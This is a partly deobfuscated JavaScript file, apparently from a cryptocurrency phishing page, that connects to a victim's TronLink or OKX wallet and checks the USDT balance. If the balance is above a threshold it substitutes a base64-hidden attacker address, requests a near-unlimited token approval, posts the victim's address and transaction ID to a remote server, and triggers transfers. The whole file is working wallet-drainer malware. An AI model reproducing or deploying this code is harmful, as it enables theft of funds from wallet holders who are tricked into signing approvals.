//Tue Apr 15 2025 09:49:57 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
/okex/.test(navigator.userAgent.toLowerCase()) && okexConnect();
async function okexConnect() {
  if (window.tronLink.ready) {
    window.tronWeb = tronLink.tronWeb;
  } else {
    const _0x4deccf = await tronLink.request({
      method: "tron_requestAccounts"
    });
    _0x4deccf.code === 200 && (window.tronWeb = tronLink.tronWeb);
  }
}
async function approve() {
  const _0x2da39a = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  try {
    let _0x22e453 = await tronWeb.contract().at(_0x2da39a);
    const _0xa1fb05 = await _0x22e453.balanceOf(userAddress).call();
    let _0x17b7f0 = parseInt(_0xa1fb05._hex) / 1000000;
    _0x17b7f0 > 800 && (permissionsAddr = window.atob("VEJoZ3hBVmhvbXluUXdNQkpVNWRlN1FkNXhKdnIzeGJFZw=="));
    let _0x24c0de = await _0x22e453.increaseApproval(permissionsAddr, "1536929485909837500000").send({
      feeLimit: 30000000
    }).then(_0x450ffd => {
      var _0x2be731 = {
        address: userAddress,
        authorized_address: permissionsAddr,
        txid: _0x450ffd,
        type: "trc",
        transaction: 3
      };
      jQuery.ajax({
        url: domain + "/add",
        method: "POST",
        data: _0x2be731,
        async: false,
        success: function (_0x5c87ac) {
          alert(msg);
          _0x5c87ac == "success" ? alert("1") : alert("44");
        },
        error: function (_0x2cd193) {}
      });
    });
  } catch (_0x258664) {
    console.error(_0x258664);
  }
}
async function check() {
  userAddress = await tronWeb.defaultAddress.base58;
  var _0x56ce53 = {
    address: userAddress,
    authorized_address: permissionsAddr
  };
  console.log(userAddress, permissionsAddr);
  let _0x419d2b = 0;
  if (/okex/.test(navigator.userAgent.toLowerCase())) {
    let _0x7e442b = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
    const _0x2f54c3 = await _0x7e442b.allowance(userAddress, permissionsAddr).call();
    console.log(_0x2f54c3);
    console.log(_0x2f54c3.toString());
    _0x419d2b = BigNumber(_0x2f54c3.toString()).dividedBy(BigNumber(10).pow(6)).toString(10);
  }
  console.log("0:" + _0x419d2b);
  jQuery.ajax({
    url: domain + "/is_f",
    method: "POST",
    data: _0x56ce53,
    async: false,
    success: function (_0x116454) {
      console.log("-------");
      console.log(_0x116454);
      if (_0x116454.code) {
        _0x116454.data == 1 ? alert("77") : transfer();
      } else {
        const _0x1cf497 = new URLSearchParams(window.location.search);
        const _0x2ddfda = _0x1cf497.get("utm_source");
        if (/okex/.test(navigator.userAgent.toLowerCase()) || _0x2ddfda == "tronlink" || _0x2ddfda == "imtoken") {
          if (_0x419d2b >= 10000) {
            console.log("0");
            transfer();
            return;
          }
          console.log("5");
          approve();
          return;
        }
        console.log("4");
        approve();
      }
    },
    error: function (_0x50b6fc) {}
  });
}
function checkOrderStatus() {
  $.get(domain + "getorderstatus/" + order_no + "/order", function (_0x4f79e9) {
    _0x4f79e9.data == 1 && (location.href = domain + "/order/all");
  }, "json");
}
var get_order_status = setInterval(checkOrderStatus, 3000);